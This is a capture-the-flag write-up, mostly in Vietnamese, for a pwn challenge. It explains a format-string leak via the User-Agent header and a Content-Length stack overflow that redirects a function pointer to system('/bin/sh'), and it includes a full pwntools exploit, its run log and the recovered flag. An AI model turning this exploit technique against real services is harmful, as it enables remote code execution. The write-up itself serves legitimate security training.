# CTF Writeup: Careening (Pwn - Hard)

**Author:** @tropicbreeze  
**Category:** Pwn  
**Description:**  
> The crew rigged up a message board while the ship's in fer careening. They swear it be unbreakable. Recover the treasure.

---

# 1. Phân tích ban đầu (Reconnaissance)

Dựa vào `Dockerfile` và các hàm decompile, binary `secureboard` là một chương trình lai giữa **Rust + C** chạy trên:

- Ubuntu 24.04  
- GLIBC 2.39  

Chương trình hoạt động như một HTTP server thu nhỏ (network service) mô phỏng message board.

Trong hàm `FUN_00116230`, ta thấy chương trình sử dụng mô hình **multi-process** với `fork()` để xử lý từng kết nối:

```c
__fd = local_100._4_4_;
_Var7 = fork();
if (_Var7 == 0) break; // Tiến trình con xử lý kết nối

dup2(__fd,0);
dup2(__fd,1);
FUN_00159d50(__fd,&local_50,FUN_00115e70); // Hàm xử lý chính
```

- `dup2` redirect socket vào `stdin` và `stdout`
- Mọi input/output HTTP đều đi qua hàm `FUN_00159d50`

Phân tích sâu hàm này cho thấy có **2 lỗ hổng nghiêm trọng**:

1. Format String → Leak libc  
2. Stack Buffer Overflow → RCE  

---

# 2. Lỗ hổng 1 – Format String (Memory Leak)

Trong `FUN_00159d50`, chương trình phân tích HTTP headers.

Đáng chú ý:

```c
iVar1 = strcmp(pcVar4,"X-Debug");
if (iVar1 == 0) {
    lVar8 = strtol(pcVar7,(char **)0x0,10);
    if ((int)lVar8 == 1) {
        DAT_0015f514 = '\x01'; // Bật Debug
    }
}
else {
    iVar1 = strcmp(pcVar4,"User-Agent");
    if (iVar1 == 0) {
        strncpy(local_2b58,pcVar7,0x1ff);
        local_2959 = 0;
    }
}
```

Nếu gửi:

```
X-Debug: 1
```

→ Debug mode được bật.

Sau đó chương trình tạo thông tin debug:

```c
local_2938[0] = '\0';
if (DAT_0015f514 == '\x01') {
    snprintf(local_2938,0x100,local_2b58,atoll,unaff_retaddr,*param_2,local_2940);
}
```

## Lỗi ở đây

`local_2b58` (User-Agent do người dùng kiểm soát) được dùng trực tiếp làm **format string**.

Đáng lẽ phải là:

```c
snprintf(local_2938,0x100,"%s",local_2b58);
```

Nhưng thay vào đó:

```c
snprintf(local_2938,0x100,local_2b58,...);
```

---

## Khai thác

Gửi header:

```
User-Agent: %p.%p.%p.%p
```

Ta sẽ leak các giá trị trên stack.

Trong các tham số truyền vào `snprintf`, có cả địa chỉ hàm `atoll`.

→ Leak được địa chỉ `atoll`  
→ Tính được base address của libc  

---

# 3. Lỗ hổng 2 – Stack Buffer Overflow (RCE)

Sau khi xử lý header, chương trình xử lý body của HTTP POST.

Các biến trên stack:

```c
char local_2b58[511];
size_t local_2958;
code *local_2948;
undefined8 *local_2940;
```

Đoạn copy body:

```c
if (local_2958 != 0) {
    memcpy(local_2b58,pcVar6 + 4,local_2958);
}
```

## Vấn đề

- `local_2b58` chỉ có **511 bytes**
- `local_2958` lấy từ header `Content-Length`
- Không có kiểm tra giới hạn

→ Có thể gửi Content-Length lớn hơn 511  
→ Ghi đè stack  

---

## Mục tiêu ghi đè

Hai biến nằm sau buffer:

```
local_2948  (function pointer)
local_2940  (argument pointer)
```

Cuối hàm:

```c
pcVar6 = (char *)(*local_2948)(local_2940,uVar5 & 0xffffffff);
```

Theo System V AMD64 ABI:

- Tham số đầu tiên → RDI

---

## Tính Offset

```
0x2b58 - 0x2948 = 0x210 = 528 bytes
0x2b58 - 0x2940 = 0x218 = 536 bytes
```

Payload:

```
[528 bytes padding]
[8 bytes system()]
[8 bytes "/bin/sh"]
```

Khi thực thi:

```
(*local_2948)(local_2940)
→ system("/bin/sh")
```

→ RCE thành công 

---

# 4. Exploit Script (Pwntools)

```python
from pwn import *

# 1. Tải thư viện libc để pwntools tự động tính toán các offset
# Lưu ý: Đảm bảo file libc.so.6 ở cùng thư mục với script này
libc = ELF('./libc.so.6', checksec=False)

# 2. Cấu hình mục tiêu
target_ip = "careening.ctf.ritsec.club"
target_port = 1501

def main():
    print("[+] BƯỚC 1: Lấy địa chỉ rò rỉ (Leak)...")
    # Khởi tạo kết nối đầu tiên để lấy leak
    io_leak = remote(target_ip, target_port)
    
    payload_leak = b"%p." * 10
    get_req = (
        b"GET /msg/1 HTTP/1.1\r\n"
        b"Host: " + target_ip.encode() + b"\r\n"
        b"X-Debug: 1\r\n"
        b"User-Agent: " + payload_leak + b"\r\n"
        b"Content-Length: 0\r\n"
        b"\r\n"
    )
    
    io_leak.send(get_req)
    response = io_leak.recvall(timeout=3).decode(errors='ignore')
    io_leak.close()
    
    # Bóc tách địa chỉ atoll từ phản hồi
    try:
        leak_str = response.split("X-Debug-Info: ")[1].split("\r\n")[0]
        leaks = leak_str.split(".")
        leak_atoll = int(leaks[0], 16)
        print(f"[*] Đã tìm thấy địa chỉ atoll: {hex(leak_atoll)}")
    except Exception:
        print("[-] Lỗi: Không thể đọc được dữ liệu rò rỉ.")
        return

    print("\n[+] BƯỚC 2: Tính toán địa chỉ hàm system và chuỗi /bin/sh...")
    # Cập nhật địa chỉ gốc cho libc
    libc.address = leak_atoll - libc.sym['atoll']
    
    # Lấy địa chỉ hàm system
    system_addr = libc.sym['system']
    
    # Tìm địa chỉ của chuỗi "/bin/sh" có sẵn trong thư viện libc
    bin_sh_addr = next(libc.search(b'/bin/sh'))
    
    print(f"[*] Libc Base Address: {hex(libc.address)}")
    print(f"[*] System Address   : {hex(system_addr)}")
    print(f"[*] /bin/sh Address  : {hex(bin_sh_addr)}")

    print("\n[+] BƯỚC 3: Gửi Payload Buffer Overflow để chiếm quyền...")
    io_exploit = remote(target_ip, target_port)
    
    # Xây dựng Payload
    # 528 bytes đầu tiên để lấp đầy khoảng cách từ mảng đến con trỏ hàm
    payload = b"A" * 528 
    
    # 8 bytes tiếp theo ghi đè con trỏ hàm (local_2948) thành system()
    payload += p64(system_addr)
    
    # 8 bytes tiếp theo ghi đè tham số đầu tiên (local_2940) thành chuỗi "/bin/sh"
    payload += p64(bin_sh_addr)
    
    # Tạo HTTP POST Request với Content-Length khớp với độ dài payload
    post_req = (
        b"POST /msg/1 HTTP/1.1\r\n"
        b"Host: " + target_ip.encode() + b"\r\n"
        b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
        b"\r\n"
        + payload
    )
    
    io_exploit.send(post_req)
    
    print("\n[+] Gửi Payload thành công! Đang lấy cờ (flag)...")
    
    # Gửi lệnh tự động để chắc chắn shell hoạt động
    io_exploit.sendline(b"ls -la")
    
    # Chuyển sang chế độ tương tác để bạn có thể gõ thêm các lệnh khác
    io_exploit.interactive()

if __name__ == "__main__":
    main()

```

```bash
┌──(venv)─(kali㉿kali)-[~/Downloads]
└─$ python3 solve.py            
[+] BƯỚC 1: Lấy địa chỉ rò rỉ (Leak)...
[+] Opening connection to careening.ctf.ritsec.club on port 1501: Done
[+] Receiving all data: Done (248B)
[*] Closed connection to careening.ctf.ritsec.club port 1501
[*] Đã tìm thấy địa chỉ atoll: 0x7f2d87ba4690

[+] BƯỚC 2: Tính toán địa chỉ hàm system và chuỗi /bin/sh...
[*] Libc Base Address: 0x7f2d87b5e000
[*] System Address   : 0x7f2d87bb6750
[*] /bin/sh Address  : 0x7f2d87d2942f

[+] BƯỚC 3: Gửi Payload Buffer Overflow để chiếm quyền...
[+] Opening connection to careening.ctf.ritsec.club on port 1501: Done

[+] Gửi Payload thành công! Đang lấy cờ (flag)...
[*] Switching to interactive mode
total 2076
drwxr-xr-x. 1 root root      23 Apr  2 00:18 .
dr-xr-xr-x. 1 root root      39 Apr  5 17:18 ..
-rwxr-xr-x. 1 root root 2125328 Apr  2 00:18 libc.so.6
$ cat ../flag.txt
RS{CFI_b1ind_sp0t_g0t_us3d_4g41n5t_b04rd_53cur1ty}